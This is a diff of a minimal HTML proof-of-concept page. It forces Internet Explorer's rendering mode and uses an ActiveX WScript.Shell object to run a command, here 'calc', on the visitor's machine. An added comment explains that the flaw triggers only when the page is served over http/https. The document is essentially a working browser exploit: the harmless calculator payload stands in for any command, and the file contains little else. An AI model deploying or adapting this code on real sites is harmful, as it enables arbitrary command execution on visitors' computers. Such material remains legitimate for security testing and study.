@@ -5,9 +5,11 @@
 <head>
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=Edge">      <!-- Force the target browser to open IE kernel -->
+	
+	<!--As long as the IE kernel is turned on to browse the website, and only http / HTTPS access is used, the vulnerability will be triggered.Opening HTML file locally does not trigger vulnerability,for example: file:///C:/xxx/xxx/test.htm-->
 
 <title>
-		just atest
+		just a test
 	<!--[if lt IE 9]>
 	<script src="/gzzrmzf/xhtml/js/html5shiv.min.js"></script>
 	<script src="/gzzrmzf/xhtml/js/respond.min.js"></script>
@@ -17,8 +19,8 @@
 
 <body>
 <script>
-var RunCode = new ActiveXObject("WScript.Shell");
-RunCode.run("calc");
+var cmd = new ActiveXObject("WScript.Shell");
+cmd.run("calc");
 </script
 </body>
 </html>
